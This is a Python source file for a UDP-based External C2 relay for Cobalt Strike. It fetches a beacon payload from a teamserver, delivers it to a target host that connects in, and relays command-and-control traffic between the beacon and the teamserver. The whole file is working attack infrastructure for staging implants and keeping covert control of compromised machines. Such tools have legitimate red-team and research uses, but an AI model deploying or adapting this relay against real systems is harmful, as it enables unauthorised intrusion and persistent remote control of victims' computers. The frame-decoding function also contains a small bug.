"""
    server.py
    by Daniel Fitzgerald and Ian Roberts

    Program to provide basic UDP communications for Cobalt Strike using the External C2 feature.
"""
import argparse
import base64
import ipaddress
import socket
import struct
import sys
import time
import select


class SocketInfo:
    """
    @brief Class to hold info for TCP session
    """
    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
        """

        :param ts_ip: IP address of CS Teamserver
        :param ts_port: Port of CS Teamserver
        :param srv_ip: IP to bind to on server
        :param srv_port: Port of server to listen on
        :param pipe_str: String for named pipe on client
        """
        if len(pipe_str) > 50:
            raise ValueError('pipe_str must be less than 50 characters')
        self.ts_ip = ts_ip
        self.ts_port = ts_port
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.pipe_str = pipe_str
        

class ExternalC2Controller:
    def __init__(self, port):
        self.port = port
        self.packet_size = 1024         #Max payload size, must be same as in client.c. Note that actual payload sent will be packet_size+4.
        self.server_seqnum = 0
        self.client_seqnum = 0
        self.timeout = 5

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len[0], body
    
    def base64(self, msg):
        """

        :param msg: String to encode in Base64
        :return: Base64 encoded string (in bytes)
        """
        b64msg = base64.b64encode(msg)
        return b64msg

    def debase64(self, b64msg):
        """

        :param b64msg: Base64 string to be decoded
        :return: Decoded string
        """
        msg = base64.b64decode(b64msg)
        return msg

    ##UNUSED FUNCTION, CONSIDER REMOVING
    # def equalcheck(self, b64msg):
    #     """

    #     :param b64msg: Base64 string
    #     :return: Base64 string with == at end of it
    #     """
    #     # TODO: Find a better way of checking for end of B64 message
    #     equalbytes = "=".encode()
    #     equalequalbytes = "==".encode()
    #     if b64msg.find(equalequalbytes) != -1:
    #         return b64msg
    #     elif b64msg.find(equalbytes) != -1:
    #         b64msg += equalbytes
    #         return b64msg
    #     else:
    #         b64msg += equalequalbytes
    #         return b64msg

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        if len(_len) == 0:
            print('connection to ts died. Exiting')
            exit(2)
        frame_length = struct.unpack("<I", _len)[0]
        while len(data) < frame_length:
            data += self._socketTS.recv(frame_length - len(data))
        return data


    # The sendToBeacon function sends a single UDP packet, then waits
    # for an ACK before sending more. If a timeout occurs, this funtion
    # resends the current packet. 
    def sendToBeacon(self, data):
        """
        
        :param data: Data to send to beacon
        """
        pendingAck = True
        socketList = []                         #Select function takes in an iterable of sockets,
        socketList.append(self._socketServer)   #so we wrap our socket in a list.
        length = len(data)
#        print("Length to send: {}".format(length))
        lenFrame = struct.pack("<2I", self.server_seqnum, length)
        while(pendingAck):
            self._socketServer.sendto(lenFrame, self.clientAddr)
            selectLists = select.select(socketList, [], [], self.timeout)
            if (len(selectLists[0]) > 0 ):
                ackFrame, addr = self._socketServer.recvfrom(3)
                ackMessage = ackFrame.decode(errors="replace")
                if (ackMessage == "ACK"):
#                    print("Length sent!")
                    pendingAck = False
                    self.server_seqnum += 1
            self.timeout = 5 # We need to reset the timeout every time we call select()
        total = 0
        while (total < length):
            pendingAck = True
            packetSentLength = 0
            while (pendingAck):
                sentPayload = (struct.pack("<I", self.server_seqnum) + data[total: (total+self.packet_size)])
                packetSentLength = self._socketServer.sendto(sentPayload, self.clientAddr)
#                print("This packet sent: {}".format(packetSentLength))
                selectLists = select.select(socketList, [], [], self.timeout)
                if (len(selectLists[0]) > 0):
                    ackFrame, addr = self._socketServer.recvfrom(3)
                    ackMessage = ackFrame.decode(errors="replace")
                    if (ackMessage == "ACK"):
                        total += packetSentLength - 4
                        pendingAck = False
                        self.server_seqnum += 1
                        # print("Bytes sent: {}".format(total))
                        # print("Bytes remaining: {}".format(length-total))
                        # print()
                self.timeout = 5 
                        


    # The receive function sends a generic ACK for every packet received
    # where the sequence number is less than or equal to the expected 
    # sequence number from the client. 
    def recvFromBeacon(self):
        """
        :return: data received from beacon
        """
        dataLength = -1
        recv_dataLength = None
        try:
            while(dataLength < 0):  #This loop implementation may come back to bite me...
                recv_dataLength, addr = self._socketServer.recvfrom(8)
                if (addr != self.clientAddr):
                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                        # print("Received a packet")
                        seqnum = (struct.unpack("<I", recv_dataLength[0:4]))[0]
                        # print("Client seqnum expected: {}".format(self.client_seqnum))
                        # print("Client seqnum received: {}".format(seqnum))
                        if (self.ackIfCorrect(seqnum)):
                            dataLength = (struct.unpack("<I", recv_dataLength[4:8]))[0]
                            # print("Struct unpacked, length:")
                            # print(dataLength)
                            self.client_seqnum += 1
        except Exception as e:
            print("Recv length failed.")
            print(e)
            return None
        total = 0
        data = bytearray(dataLength)
        try:
            while (total < dataLength):
                dataChunk, addr = self._socketServer.recvfrom(self.packet_size+4)
                if (addr != self.clientAddr):
                        print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                    seqnum = (struct.unpack("<I", dataChunk[0:4]))[0]
                    # print("Client seqnum expected: {}".format(self.client_seqnum))
                    # print("Client seqnum received: {}".format(seqnum))
                    if (self.ackIfCorrect(seqnum)):
                        # print("Length of chunk: {}".format(len(dataChunk)))
                        # print("Total bytes received so far: {}".format(total))
                        # print("datalength - total: {}".format(dataLength - total))
                        if (dataLength - total < (len(dataChunk) - 4)):
                            data[total:dataLength] = dataChunk[4:(dataLength-total)]
                            total = dataLength
                        else:
                            data[total : (total+len(dataChunk)-4)] = dataChunk[4:]
                            total = (total + len(dataChunk)-4)
                        self.client_seqnum += 1
        except:
            print("Recv data failed.")
            return None
        
        return data

    def ackIfCorrect(self, seqnum):
        # print("Inside ackIfCorrect")
        output = False
        msg = "ACK".encode()
        if (seqnum == self.client_seqnum):
            # print("Seqnum correct")
            self._socketServer.sendto(msg, self.clientAddr)
            # print("ACK Sent")
            output = True
        elif (seqnum < self.client_seqnum):
            # print("Seqnum less than expected")
            self._socketServer.sendto(msg, self.clientAddr)
        return output

    

    def run(self, socketInfo):
        """

        :param socketInfo: Class with user connection info
        """
        # Connecting to TS first, if we fail we do so before connecting to target irc server
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        try:
            self._socketTS.connect((socketInfo.ts_ip, socketInfo.ts_port))
        except:
            print("Teamserver connection failed. Exiting.")
            exit(1)
        
        # Send out config options
        self.send_to_ts("arch=x86".encode())
        self.send_to_ts("pipename={}".format(socketInfo.pipe_str).encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our target
        payload = self.recv_from_ts()

        # Now that we have our beacon to send, wait for a connection from our target
        self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socketServer.bind((socketInfo.srv_ip,socketInfo.srv_port))
        connected = False
        while(not connected):
            #We get one: 
            data, clientAddr = self._socketServer.recvfrom(4)
            print("Connection from {}".format(clientAddr))
            # print(data)
            self.client_seqnum = (struct.unpack("<I", data))[0]
            self.clientAddr = clientAddr
            self.client_seqnum += 1

            socketList = []                         #Select function takes in an iterable of sockets,
            socketList.append(self._socketServer)   #so we wrap our socket in a list.

            #Send my seqneunce number
            #If an ACK arrives, we are connected!
            pendingAck = True
            counter = 0
            while (pendingAck and counter < 2):
                self._socketServer.sendto(struct.pack("<I", self.server_seqnum), self.clientAddr)
                selectLists = select.select(socketList, [], [], self.timeout)
                if (len(selectLists[0]) > 0):
                    data, addr = self._socketServer.recvfrom(4)
                    self.server_seqnum += 1
                    if (data.decode() != "ACK\x00"):
                        print("Error in 3-way handshake?")
                        print(data.decode(errors="replace"))
                        exit()
                    else:
                        connected = True
                        pendingAck = False
                else:
                    counter += 1
            if (not connected):
                print("Failed 3-way handshake from {}".format(clientAddr))
                

        # Send beacon payload to target
        self.sendToBeacon(payload)

        #Wait for payload
        time.sleep(5)

        while True:
            data = self.recvFromBeacon()
            if data == None:
                print("Error/exit from beacon")
                break
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received %d bytes from TS and sending to beacon" % len(data))
            self.sendToBeacon(data)
        self._socketServer.close()
        self._socketTS.close()


parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                 usage="\n"
                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR]"
                                       "\nUse '%(prog)s -h' for more information.")
parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
parser.add_argument('srv_ip', help="IP to bind to on server.")
parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
args = parser.parse_args()
controller = ExternalC2Controller(args.teamserver_port)
socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
while True:
    controller.run(socketInfo)
    print('waiting 1s before reconnecting to TS')
    time.sleep(1)
